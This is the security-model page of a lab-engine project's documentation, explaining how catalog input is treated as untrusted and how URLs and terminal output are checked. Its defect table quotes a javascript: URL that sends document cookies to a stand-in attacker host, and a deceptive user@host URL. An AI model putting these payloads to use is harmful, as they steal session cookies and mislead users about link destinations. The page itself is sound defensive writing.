# The security model

**Audience:** contributors to the engine, catalog authors, and anyone building
on the machine output. It says where the trust boundary runs, what the engine
refuses to do, and — just as important — what it does **not** protect you from.

**Language:** [English](./security.md) · [Français](./security.fr.md)

To report a vulnerability, see [SECURITY.md](../SECURITY.md). This page is the
model, not the process.

---

## The rule

> **A catalog is untrusted input. A value from the contract is data, never an
> instruction.**

`dsoxlab catalog add <url>` clones an arbitrary git repository. Everything that
repository declares — identifiers, titles, URLs, section names — was written by
someone else, and reaches your terminal, your browser and, with `dsoxlab
export`, documents you hand to a third party.

Every rule below follows from that single sentence.

---

## Where the boundary runs

| Untrusted | Why |
| --- | --- |
| `meta.yml`, `lab.yaml`, `course.yaml` | Written by the catalog |
| `.git/config` of a cloned catalog, including its `origin` remote | Same |
| Markdown, fixtures and file names inside a lab | Same |
| Directory names under `~/.local/share/dsoxlab/catalogs/` | Created from a URL you passed |

| Trusted | Why |
| --- | --- |
| dsoxlab's own package metadata (`pyproject.toml`) | Shipped with the engine |
| The i18n strings | Same |
| Terraform and cloud-init templates | Packaged in the engine, not in catalogs |

The parser stays **permissive** on purpose: v1 guarantees that a lab keeps
loading. So a field can hold anything a YAML file can hold — a list where a
string was expected, control characters, markup, a `javascript:` URL. Validation
is a **lint for the author**, not a barrier: `validate-structure` is neither
automatic nor required before you use a catalog. Security checks are therefore
replayed **at the point of use**.

---

## Three primitives, one implementation each

Two implementations of one policy always drift apart, and it is the more
permissive one that decides. So each rule lives in exactly one place, under
`src/dsoxlab/security/`.

| Primitive | Applies to | Behaviour |
| --- | --- | --- |
| `identifiant_sur()` | Identifiers that **leave** the engine: `catalog.id`, `lab_id`, `section` in the evidence document | **Refuses.** Cleaning an identifier would silently break the link between a proof and the lab it attests |
| `url_sure()` | Every URL from a catalog: `doc_url`, `repo.issues_url`, the derived remote URL | **Refuses.** Returns the normalised URL, or raises with a reason |
| `neutraliser()` / `texte_affichable()` | Every contract value rendered in the terminal | **Neutralises.** Reading is the service being rendered; a questionable title does not justify a failed read |

Refusing and neutralising are not interchangeable, and the difference is the
point: what travels must be exact or absent, what is displayed must be readable.

### The URL policy

One parser, two declarative policies — a parameter, not a second validator:

| Policy | Schemes | Used by |
| --- | --- | --- |
| `DOCUMENTATION` | `http`, `https` | `doc_url`, issue URLs. Plain HTTP is still accepted: catalogs and forges publish it, the value is displayed rather than sent with a secret, and refusing it would break existing catalogs without protecting anything |
| `PORTAIL` | `https` only | Evidence destinations (`learning.portal_url`). The link will carry results; in the clear they are exposed on the way |

The portal has one documented exception, for whoever is writing a portal: with
`DSOXLAB_PORTAL_LOCAL=1`, an `http` URL towards `localhost`, `127.0.0.1` or
`[::1]` is accepted. Two guards rather than one — the variable **and** a local
host — because `http` towards a remote host is a different thing, and a variable
that meant "trust me on everything" would be no guard at all. It is an
environment variable, never a contract field: the machine playing the lab decides,
not the catalogue.

Common to both: the URL is really parsed, a hostname is required, `user:password@`
is refused, control characters are refused, and the value is normalised before
it is displayed.

---

## What the engine never does

**No network probing inside a security check.** Nothing resolves a name, opens a
connection or follows a redirect in order to decide whether a URL is acceptable.
A catalog declaring `doc_url: http://192.168.1.1/admin` would otherwise make
your machine — or the CI runner — issue that request. `validate-structure
--check-urls` is a separate feature: a deliberate, explicit network check.

**No implicit navigation.** A syntactically safe URL is not an approved
destination. `dsoxlab guide` prints the address; `--open` opens it, because you
asked. `support --issue` names the repository and asks before opening anything.

**No terminal steering.** Contract values are escaped before they are
interpolated into Rich markup, control characters and direction overrides are
replaced, and no clickable hyperlink is built from a raw catalog string — the
target of a `[link=…]` is not what the eye reads.

**No personal data in the evidence document.** `dsoxlab export` is built by a
positive allowlist, never by serialising an internal object and removing keys.
See [the machine output](./machine-output.md) for the field-by-field contract.

---

## What this does **not** protect you from

A lab runs code on your machine, by design: `setup.yaml` and `cleanup.yaml` are
Ansible playbooks, `challenge/tests/` is a pytest suite, and `runtime.services`
starts the container image the lab names. All of it comes from the catalog, and
all of it runs with your privileges.

**dsoxlab is not a sandbox.** The primitives above stop a catalog from making
the *engine* act on its behalf — opening a URL, steering your terminal, smuggling
a field into a document you sign. They do not, and cannot, stop a catalog from
doing what a catalog is for.

So the first rule is the one that no code can enforce: **add catalogs you
trust**, the way you would install any other package. A lab repository deserves
the same look you would give a `curl … | bash`, because that is the same order of
magnitude of trust. If you run an untrusted catalog, run it in a throwaway VM —
which is exactly what [the appliance](./appliance.md) is.

---

## The record

Each rule above comes from a defect that was reproduced, not imagined.

| Defect | What it did |
| --- | --- |
| `doc_url: "javascript:fetch('https://attaquant.test/'+document.cookie)"` | `dsoxlab guide --print` printed it as-is; without `--print` it reached `webbrowser.open()` |
| `title: "Titre [red]x[/red] et [/] non apparié"` | `list-labs` and `show` exited with a Python traceback (`MarkupError`). One character made a whole catalog unviewable |
| `catalog.path` in the evidence document | Leaked the local user's home directory into a document meant for a third party |
| `repo.issues_url` checked with `startswith("http")` | Would have accepted `https://vrai-site.test@attaquant.test/` — the eye reads the first name, the browser goes to the second |

---

## Extending this

If you add a contract field that is **displayed**, **transformed into a link**,
or **exported**, route it through the primitive that fits. Then write the
negative test: a policy is a list of refusals, and only the refusals prove it.

The tests are the enforcement mechanism, not this page:

- `tests/test_securite_urls.py` — schemes, structure, the absence of any network
  call, and the proof that a raw contract value cannot reach `webbrowser.open()`
- `tests/test_securite_terminal.py` — escaping, and the `MarkupError` regression
- `tests/test_securite_identifiants.py` — what may leave the engine
- `tests/test_export_preuves.py` — the evidence allowlist, including what must
  never appear in it
